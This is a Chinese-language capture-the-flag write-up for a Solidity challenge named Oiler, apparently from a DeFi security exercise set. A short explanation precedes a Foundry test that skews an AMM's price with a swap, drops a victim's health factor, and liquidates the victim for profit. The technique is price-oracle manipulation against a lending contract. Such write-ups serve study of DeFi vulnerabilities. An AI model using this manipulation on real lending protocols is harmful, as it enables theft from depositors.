### oilver
这道题涉及一个金库和swap池，superman提供100token，100dai给swap做市，在deposite 100 token，并borrow 75 dtoken，不过并没有withdraw，第一个任务要清算superman，清算条件是healthFactor计算出的值小于100，并且在清算的时候我们要提供他borraw的dtoken的百分之五dtoken。

清算要求的healthFactor计算值是根据amm得到的价值计算的，所以我们要先swap一下改变价值，不过不能全都swap，要留一点用于清算，慢慢尝试即可，最后将清算的钱发回我们账户，再进行swap即可。我在这个题犯了点小错误，log里的操作是会执行的，我想查看最后一步swap能得到多少token，我原本写了个log，里面是调用swap的操作，这就已经swap了，我后续又写了个swap导致失败，删除log就ok了。




```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Oiler} from "../src/8_oiler/Oiler.sol";
import {AMM} from "../src/8_oiler/AMM.sol";

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge8Test is Test {
    Oiler public oiler;
    AMM public amm;

    ERC20 token;
    ERC20 dai;

    address player;
    address superman;

    function setUp() public {
        /**
         * @notice Create ERC20 tokens
         */
        token = new ERC20("Token", "TKN");
        dai = new ERC20("DAI token", "DAI");
        vm.label(address(token), "TKN");
        vm.label(address(dai), "DAI");

        /**
         * @notice Deploy contant prodcut AMM with a TOKEN <> DAI pair
         */
        amm = new AMM(address(token), address(dai));
        vm.label(address(amm), "amm");

        /**
         * @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and
         * mints a 'dTOKEN' underlying debt token.
         */
        oiler = new Oiler(address(token), address(amm));
        vm.label(address(oiler), "oiler");

        /**
         * @notice Create 2 accounts and fund them.
         * - Player starts with 100 TOKEN and 100 DAI
         * - Superman starts with 200 TOKEN and 200 DAI,
         * Superman adds 100 of each to the pool.
         */
        player = makeAddr("player");
        superman = makeAddr("Super-man");
        deal(address(token), player, 100);
        deal(address(dai), player, 100);
        deal(address(token), superman, 200);
        deal(address(dai), superman, 200);

        /**
         * @notice Add liquidity to AMM pair.
         */
        vm.startPrank(superman);
        token.approve(address(amm), type(uint256).max);
        dai.approve(address(amm), type(uint256).max);
        amm.addLiquidity(100, 100);
        vm.stopPrank();
    }


    function testSolution()public {
        // Victim set up
        vm.startPrank(superman);
        token.approve(address(oiler), 100);
        oiler.deposit(100);
        oiler.maxBorrow(superman); // Always account for 2 Decimal places
        oiler.borrow(75);
        oiler.healthFactor(superman);
        vm.stopPrank();
        

        // Player initial balance is of 100 $TOKEN and 100 $DAI
        console.log("Initial token balance: ", token.balanceOf(player));
        console.log("Initial dai balance: ", dai.balanceOf(player));
        console.log("helthfactor: ", oiler.healthFactor(player));
        vm.startPrank(player);

        /*////////////////////////////////////////////////////
        //            Add your attack logic below!          //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge8Test -vvvv //
        ////////////////////////////////////////////////////*/
        token.approve(address(amm),type(uint256).max);
        dai.approve(address(amm),type(uint256).max);
        token.approve(address(oiler),type(uint256).max);
        //swap改变一下价格
        amm.swap(address(token),70);
        console.log("helthfactor: ", oiler.healthFactor(superman));
        console.log("token0 is",amm.getPriceToken0());
        console.log("token1 is",amm.getPriceToken1());

        oiler.deposit(30);
        //这里存款是为了borrow，满足清算时的支付
        console.log("we need borrowed",oiler.getUserData(superman).borrow*5/100);
        console.log("we can borrow",oiler.maxBorrow(player));
        oiler.borrow(4);

        oiler.liquidate(superman);

        oiler.withdraw(oiler.balanceOf(player));

        console.log("Initial token balance: ", token.balanceOf(player));
        console.log("Initial dai balance: ", dai.balanceOf(player));

        console.log("token0 is",amm.getPriceToken0());
        console.log("token1 is",amm.getPriceToken1());

        

        amm.swap(address(dai),dai.balanceOf(player));

        //==================================================//
        vm.stopPrank();

        // Conditions to pass:
        //      - Player has liquidated the victim
        //      - Player has more than 150 $TOKENs
        //      - Extra: Player has more than 200 $TOKENs
        Oiler.User memory victim = oiler.getUserData(superman);
        assertEq(victim.liquidated, true);
        assert(token.balanceOf(player) > 200);

    }

}
```
